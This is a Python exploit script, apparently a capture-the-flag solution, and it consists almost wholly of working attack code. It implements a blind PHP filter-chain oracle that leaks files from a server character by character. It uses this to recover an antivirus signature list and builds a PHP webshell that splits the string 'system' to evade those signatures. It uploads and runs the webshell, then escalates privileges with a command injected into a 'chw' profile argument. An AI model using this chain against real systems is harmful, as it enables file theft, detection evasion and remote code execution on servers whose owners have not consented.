
import os
import re
import sys
import json
import time

import requests


from enum import Enum

class Verb(Enum):
    POST = "POST"
    GET = "GET"
    PUT = "PUT"
    DELETE = "DELETE"


def merge_dicts(dict1, dict2):
    merged = dict1.copy()
    for key, value in dict2.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_dicts(merged[key], value)
        else:
            merged[key] = value
    return merged


class Requestor:
    def __init__(self, file_to_leak, target, parameter, data="{}", headers="{}", verb=Verb.POST, in_chain="", proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):
        self.file_to_leak = file_to_leak
        self.target = target
        self.parameter = parameter
        self.headers = headers
        self.verb = verb
        self.json_input = json_input
        self.match = match
        print("[*] The following URL is targeted : {}".format(self.target))
        print("[*] The following local file is leaked : {}".format(self.file_to_leak))
        print("[*] Running {} requests".format(self.verb.name))
        if data != "{}":
            print("[*] Additionnal data used : {}".format(data))
        if headers != "{}":
            print("[*] Additionnal headers used : {}".format(headers))
        if in_chain != "":
            print("[*] The following chain will be in each request : {}".format(in_chain))
            in_chain = "|convert.iconv.{}".format(in_chain)
        if match:
            print("[*] The following pattern will be matched for the oracle : {}".format(match))
        self.in_chain = in_chain
        self.data = json.loads(data)
        self.headers = json.loads(headers)
        self.delay = float(delay)
        if proxy :
            self.proxies = {
                'http': f'{proxy}',
                'https': f'{proxy}',
            }
        else:
            self.proxies = None
        self.instantiate_session()
        if time_based_attack:
            self.time_based_attack = self.error_handling_duration()
            print("[+] Error handling duration : {}".format(self.time_based_attack))
        else:
            self.time_based_attack = False

    def instantiate_session(self):
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.proxies = self.proxies
        self.session.verify = False


    def join(self, *x):
        return '|'.join(x)

    def error_handling_duration(self):
        chain = "convert.base64-encode"
        requ = self.req_with_response(chain)
        self.normal_response_time = requ.elapsed.total_seconds()
        self.blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)
        chain_triggering_error = f"convert.base64-encode|{self.blow_up_inf}"
        requ = self.req_with_response(chain_triggering_error)
        return requ.elapsed.total_seconds() - self.normal_response_time

    def parse_parameter(self, filter_chain):
        data = {}
        if '[' and ']' in self.parameter:

            main_parameter = [re.search(r'^(.*?)\[', self.parameter).group(1)]
            sub_parameters = re.findall(r'\[(.*?)\]', self.parameter)
            all_params = main_parameter + sub_parameters
            json_object = {}
            temp = json_object
            for i, element in enumerate(all_params):
                if i == len(all_params) -1:
                    temp[element] = filter_chain
                else:
                    temp[element] = {}
                    temp = temp[element]
            data = json_object
        else:
            data[self.parameter] = filter_chain
        return merge_dicts(data, self.data)

    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)

        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'

        merged_data = self.parse_parameter(filter_chain)

        try:
            if self.verb == Verb.GET:
                requ = self.session.get(self.target, params=merged_data)
                return requ
            elif self.verb == Verb.PUT:
                if self.json_input:
                    requ = self.session.put(self.target, json=merged_data)
                else:
                    requ = self.session.put(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.DELETE:
                if self.json_input:
                    requ = self.session.delete(self.target, json=merged_data)
                else:
                    requ = self.session.delete(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.POST:
                if self.json_input:
                    requ = self.session.post(self.target, json=merged_data)
                else:
                    requ = self.session.post(self.target, data=merged_data)
                return requ
        except requests.exceptions.ConnectionError :
            print("[-] Could not instantiate a connection")
            exit(1)
        return None

    def error_oracle(self, s):
        requ = self.req_with_response(s)

        if self.match:

            return self.match in requ.text

        if self.time_based_attack:

            return requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01)


        return requ.status_code == 500


from abc import abstractmethod
import binascii
from base64 import b64decode
from os import get_terminal_size as _get_terminal_size


class _TermSize:
    columns = 80


def get_terminal_size():
    try:
        ts = _get_terminal_size()
        if ts.columns:
            return ts
    except OSError:
        pass
    return _TermSize()
from typing import Generator

__all__ = [
    "BruteforceError",
    "Bruteforcer",
    "RequestorBruteforcer",
]


class BruteforceError(Exception):
    pass


class Bruteforcer:

    BLOW_UP_UTF32 = "convert.iconv.L1.UCS-4"
    BLOW_UP_INFINITY = "|".join([BLOW_UP_UTF32] * 15)
    HEADER = f"convert.base64-encode"
    FLIP = "convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"

    FLIP_WARNING_FRIENDLY = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"
    R2 = "convert.iconv.CSUNICODE.UCS-2BE"
    R4 = "convert.iconv.UCS-4LE.10646-1:1993"
    ROT1 = "convert.iconv.437.CP930"
    BE = "convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode"

    offset: int

    def __init__(self, offset: int) -> None:
        self.offset = offset

    @abstractmethod
    def send(self, filters: str) -> bool:
        pass

    def get_nth(self, n: int) -> str:
        o = []
        chunk = n // 2
        if chunk % 2 == 1:
            o.append(self.R4)
        o.extend([self.FLIP, self.R4] * int(chunk // 2))
        if (n % 2 == 1) ^ (chunk % 2 == 1):
            o.append(self.R2)
        return "|".join(o)

    def find_letter(self, prefix: str) -> str:
        if not self.send(f"{prefix}|dechunk|{self.BLOW_UP_INFINITY}"):

            if not self.send(f"{prefix}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"):

                for n in range(5):
                    if self.send(
                        f"{prefix}|"
                        + f"{self.ROT1}|{self.BE}|" * (n + 1)
                        + f"{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
                    ):
                        return "edcba"[n]
                        break
                else:
                    return False
            elif not self.send(
                f"{prefix}|string.tolower|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):

                for n in range(5):
                    if self.send(
                        f"{prefix}|string.tolower|"
                        + f"{self.ROT1}|{self.BE}|" * (n + 1)
                        + f"{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
                    ):
                        return "EDCBA"[n]
                        break
                else:
                    return False
            elif not self.send(
                f"{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "*"
            elif not self.send(
                f"{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
            ):

                return "f"
            elif not self.send(
                f"{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
            ):

                return "F"
            else:
                return False
        elif not self.send(f"{prefix}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"):

            if not self.send(
                f"{prefix}|string.rot13|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):

                for n in range(5):
                    if self.send(
                        f"{prefix}|string.rot13|"
                        + f"{self.ROT1}|{self.BE}|" * (n + 1)
                        + f"{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
                    ):
                        return "rqpon"[n]
                        break
                else:
                    return False
            elif not self.send(
                f"{prefix}|string.rot13|string.tolower|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):

                for n in range(5):
                    if self.send(
                        f"{prefix}|string.rot13|string.tolower|"
                        + f"{self.ROT1}|{self.BE}|" * (n + 1)
                        + f"{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
                    ):
                        return "RQPON"[n]
                        break
                else:
                    return False
            elif not self.send(
                f"{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
            ):

                return "s"
            elif not self.send(
                f"{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
            ):

                return "S"
            else:
                return False
        elif not self.send(
            f"{prefix}|{self.ROT1}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            if not self.send(
                f"{prefix}|convert.iconv.UTF8.IBM1140|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "+"
            elif self.send(
                f"{prefix}|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "k"
            elif self.send(
                f"{prefix}|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "j"
            elif self.send(
                f"{prefix}|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "i"
            else:
                return False
        elif not self.send(
            f"{prefix}|string.tolower|{self.ROT1}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            if self.send(
                f"{prefix}|string.tolower|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "K"
            elif self.send(
                f"{prefix}|string.tolower|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "J"
            elif self.send(
                f"{prefix}|string.tolower|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "I"
            else:
                return False
        elif not self.send(
            f"{prefix}|string.rot13|{self.ROT1}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            if self.send(
                f"{prefix}|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "x"
            elif self.send(
                f"{prefix}|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "w"
            elif self.send(
                f"{prefix}|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "v"
            else:
                return False
        elif not self.send(
            f"{prefix}|string.tolower|string.rot13|{self.ROT1}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            if self.send(
                f"{prefix}|string.tolower|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "X"
            elif self.send(
                f"{prefix}|string.tolower|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "W"
            elif self.send(
                f"{prefix}|string.tolower|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "V"
            else:
                return False
        elif not self.send(
            f"{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "Z"
        elif not self.send(
            f"{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "z"
        elif not self.send(
            f"{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "M"
        elif not self.send(
            f"{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "m"
        elif not self.send(
            f"{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "y"
        elif not self.send(
            f"{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "Y"
        elif not self.send(
            f"{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "l"
        elif not self.send(
            f"{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "L"
        elif not self.send(
            f"{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "h"
        elif not self.send(
            f"{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "H"
        elif not self.send(
            f"{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "u"
        elif not self.send(
            f"{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "U"
        elif not self.send(
            f"{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "g"
        elif not self.send(
            f"{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "G"
        elif not self.send(
            f"{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "t"
        elif not self.send(
            f"{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "T"
        elif not self.send(
            f"{prefix}|convert.iconv.UTF8.CP930|dechunk|{self.BLOW_UP_INFINITY}"
        ):

            return "/"
        else:
            return "*"

    def find_number(self, i: int) -> str:
        prefix = f"{self.HEADER}|{self.get_nth(i)}|convert.base64-encode"

        s = self.find_letter(prefix)

        if s == "M":

            prefix = f"{self.HEADER}|{self.get_nth(i)}|convert.base64-encode|{self.R2}"
            ss = self.find_letter(prefix)
            if ss in "CDEFGH":
                return "0"
            elif ss in "STUVWX":
                return "1"
            elif ss in "ijklmn":
                return "2"
            elif ss in "yz*":
                return "3"
        elif s == "N":

            prefix = f"{self.HEADER}|{self.get_nth(i)}|convert.base64-encode|{self.R2}"
            ss = self.find_letter(prefix)
            if ss in "CDEFGH":
                return "4"
            elif ss in "STUVWX":
                return "5"
            elif ss in "ijklmn":
                return "6"
            elif ss in "yz*":
                return "7"
        elif s == "O":

            prefix = f"{self.HEADER}|{self.get_nth(i)}|convert.base64-encode|{self.R2}"
            ss = self.find_letter(prefix)
            if ss in "CDEFGH":
                return "8"
            elif ss in "STUVWX":
                return "9"
        else:
            return "*"

    def find_value(self, i: int) -> str:
        while True:
            prefix = f"{self.HEADER}|{self.get_nth(i)}"
            letter = self.find_letter(prefix)

            if letter == "*":
                letter = self.find_number(i)
            if letter == "*" and self.FLIP != self.FLIP_WARNING_FRIENDLY:
                self.FLIP = self.FLIP_WARNING_FRIENDLY
            else:
                break
        return letter

    def pad_base64(self, base64: str) -> str:

        offset = len(base64) % 4

        if offset >= 2:
            return base64 + (4 - offset) * "="
        elif offset == 1:
            return base64 + "A=="
        return base64

    def bruteforce(self) -> Generator[tuple[str, bytes], None, None]:

        base64 = ""
        i = int((4 * self.offset / 3) // 4) * 4

        while True:
            letter = self.find_value(i)

            if not letter:
                break

            i += 1

            base64 += letter
            decoded = b64decode(self.pad_base64(base64))

            yield base64, decoded


class RequestorBruteforcer(Bruteforcer):

    def __init__(self, requestor, offset: int = 0) -> None:
        self.requestor = requestor
        self.base64 = ""
        self.data = b""
        super().__init__(offset)

        if offset != 0:
            print("[*] Offset of the first character leaked : {}".format(offset))

    def send(self, filters: str) -> bool:
        return self.requestor.error_oracle(filters)

    def find_value(self, i: int) -> str:
        old_flip = self.FLIP
        data = super().find_value(i)
        if old_flip != self.FLIP:
            print("[*] Trying the process in a warning friendly way")
        return data

    def bruteforce(self) -> str:

        for self.base64, self.data in super().bruteforce():
            print(self.base64, flush=True)
            print(self.data, flush=True)


            try:
                for _ in range(
                    0, int(len(self.base64) // get_terminal_size().columns) + 1
                ):
                    print("\033[1A", end="\x1b[2K")
                for _ in range(
                    0,
                    int(len(str(self.data)) // get_terminal_size().columns) + 1,
                ):
                    print("\033[1A", end="\x1b[2K")
            except binascii.Error:
                print("[*] binascii error, no character could be retrieved")
                return ""


def leak_file(check_url, remote_path, parameter="sample"):
    requestor = Requestor(
        remote_path,
        check_url,
        parameter,
        data="{}",
        headers="{}",
        verb=Verb.POST,
        in_chain="",
        proxy=None,
        time_based_attack=False,
        delay=0.0,
        json_input=False,
        match="Fatal error",
    )
    bruteforcer = RequestorBruteforcer(requestor, 0)
    bruteforcer.bruteforce()
    return bruteforcer.data


CHW_EXPLOIT_CMD = '/usr/local/bin/chw archive --file /etc/hostname --profile "cat /flag #"'


def parse_ndb_blacklist(ndb_bytes):
    banned = []
    for line in ndb_bytes.decode(errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split(":")
        if len(parts) < 4:
            continue
        try:
            banned.append(bytes.fromhex(parts[3]).decode())
        except ValueError:
            continue
    return banned


def split_clean(token, banned):
    for cut in range(1, len(token)):
        left, right = token[:cut], token[cut:]
        if not any(b in left for b in banned) and not any(b in right for b in banned):
            return left, right
    raise RuntimeError(f"could not find a safe split point for {token!r}")


def build_payload(banned):
    left, right = split_clean("system", banned)
    return (
        "<?php\n"
        f"$fn = '{left}' . '{right}';\n"
        "$fn($argv[1] !== '' ? $argv[1] : 'id');\n"
    )


def solve(base_url, shell_cmd=CHW_EXPLOIT_CMD):
    base_url = base_url.rstrip("/")

    print("[*] Stage 1/4: leaking /opt/sigs/custom.ndb through the blind oracle ...")
    ndb_bytes = leak_file(base_url + "/check.php", "/opt/sigs/custom.ndb")

    leaked_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "leaked_custom.ndb")
    with open(leaked_path, "wb") as f:
        f.write(ndb_bytes)
    print(f"[+] Raw leaked ruleset saved to {leaked_path}")

    banned = parse_ndb_blacklist(ndb_bytes)
    print(f"[+] {len(banned)} banned literal substrings recovered:")
    for b in banned:
        print(f"      {b!r}")

    print("[*] Stage 2/4: crafting + uploading a bypass payload ...")
    payload = build_payload(banned)
    print("---\n" + payload + "---")

    r = requests.post(
        base_url + "/",
        files={"webshell": ("bypass.php", payload, "application/x-php")},
        timeout=15,
    )
    r.raise_for_status()
    m = re.search(r"/run\.php\?f=([A-Za-z0-9._-]+\.php)", r.text)
    if not m:
        raise RuntimeError(f"upload was not accepted, response:\n{r.text}")
    fname = m.group(1)
    print(f"[+] Uploaded and cleared by the AV as {fname}")

    print("[*] Stage 3/4: landing code exec as appuser via /run.php ...")
    r = requests.get(base_url + "/run.php", params={"f": fname, "c": "id"}, timeout=15)
    r.raise_for_status()
    print(f"[+] {r.text.strip()}")

    print(f"[*] Stage 4/4: privesc via chw ({shell_cmd!r}) ...")
    r = requests.get(
        base_url + "/run.php",
        params={"f": fname, "c": shell_cmd},
        timeout=15,
    )
    r.raise_for_status()
    return r.text.strip()


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8290"
    print(solve(target))
